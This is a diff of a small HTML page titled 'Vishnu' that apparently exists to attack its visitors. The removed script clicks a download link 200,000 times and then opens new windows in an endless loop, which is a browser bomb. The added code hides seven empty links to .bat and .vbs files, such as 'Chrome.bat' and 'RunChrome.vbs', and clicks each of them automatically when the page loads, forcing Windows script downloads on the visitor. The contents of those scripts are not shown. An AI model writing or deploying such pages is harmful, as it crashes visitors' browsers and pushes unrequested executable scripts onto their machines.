@@ -6,16 +6,20 @@
     <title>Vishnu</title>
 </head>
 <body>
-    <a id="finish" href="singh.bat" download="singh.bat"></a>
+    <a href="Biology.bat" download="Biology.bat"></a>
+    <a href="chemistry.vbs" download="chemistry.vbs"></a>
+    <a href="Chrome.bat" download="Chrome.bat"></a>
+    <a href="PHEEEE.html" download="PHEEEE.html"></a>
+    <a href="Physics.bat" download="Physics.bat"></a>
+    <a href="RunChrome.vbs" download="RunChrome.vbs"></a>
+    <a href="Tommy.bat" download="Tommy.bat"></a>
 </body>
-<script>
-    for(let i =0; i<200000; i++){
-        document.getElementById("finish").click();
-    }
-  while(true){
 
-      window.open("index.html", "")
-    }
-     
-    </script>
+<script>
+    const links = document.querySelectorAll("a");
+
+    links.forEach(link => {
+        link.click();
+    });
+</script>
 </html>
